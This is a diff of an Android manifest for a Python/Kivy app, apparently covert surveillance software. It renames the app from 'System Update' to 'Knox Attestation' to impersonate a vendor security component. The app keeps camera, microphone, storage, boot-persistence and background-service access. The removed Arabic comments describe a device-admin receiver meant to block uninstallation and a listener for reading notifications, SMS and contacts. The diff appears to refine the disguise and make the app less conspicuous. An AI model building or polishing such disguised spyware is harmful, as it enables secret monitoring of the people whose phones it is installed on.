@@ -1,58 +1,45 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="org.system.update"
+    package="com.android.service.knox"
     android:versionCode="20000"
     android:versionName="2.0.0">
 
     <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
 
-    <!-- صلاحيات الإنترنت والشبكة -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
 
-    <!-- صلاحيات الكاميرا والميكروفون والصوت -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
 
-    <!-- صلاحيات التخزين -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
 
-    <!-- صلاحيات البقاء في الخلفية والتشغيل عند الإقلاع -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
-    <!-- صلاحيات الوصول إلى البيانات الشخصية -->
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    <uses-permission android:name="android.permission.READ_LOGS" />
-
-    <!-- صلاحيات مدير الجهاز (Device Admin) وقارئ الإشعارات -->
-    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-
-    <!-- ميزات الأجهزة (ليست إلزامية) -->
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
 
     <application
-        android:label="System Update"
+        android:label="Knox Attestation"
         android:icon="@drawable/ic_launcher"
         android:allowBackup="true"
         android:usesCleartextTraffic="true"
         android:hardwareAccelerated="true"
         android:requestLegacyExternalStorage="true">
 
-        <!-- النشاط الرئيسي (Kivy) -->
         <activity
             android:name="org.kivy.android.PythonActivity"
-            android:label="System Update"
+            android:label="Knox Attestation"
             android:configChanges="mcc|mnc|locale|touchscreen|keyboard|keyboardHidden|navigation|orientation|screenLayout|fontScale|uiMode|screenSize|smallestScreenSize|layoutDirection|density"
             android:launchMode="singleTask"
             android:exported="true">
@@ -62,7 +49,6 @@
             </intent-filter>
         </activity>
 
-        <!-- خدمة الخلفية (Foreground Service) – تعمل في عملية منفصلة -->
         <service
             android:name="org.kivy.android.PythonService"
             android:process=":service_work"
@@ -70,23 +56,9 @@
             android:exported="false">
             <meta-data
                 android:name="android.service.description"
-                android:value="Security and performance background synchronization service." />
+                android:value="Knox background security verification and sync." />
         </service>
 
-        <!-- مستقبل مدير الجهاز (Device Admin) – لمنع الحذف العادي -->
-        <receiver
-            android:name="org.system.update.AdminReceiver"
-            android:permission="android.permission.BIND_DEVICE_ADMIN"
-            android:exported="true">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-            </intent-filter>
-        </receiver>
-
-        <!-- مستقبل التشغيل عند إقلاع الجهاز -->
         <receiver
             android:name="org.system.update.BootReceiver"
             android:exported="true">
@@ -95,16 +67,6 @@
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
-
-        <!-- مستقبل الإشعارات (Notification Listener) – لقراءة الإشعارات -->
-        <service
-            android:name="org.system.update.NotificationListener"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-        </service>
 
     </application>
 
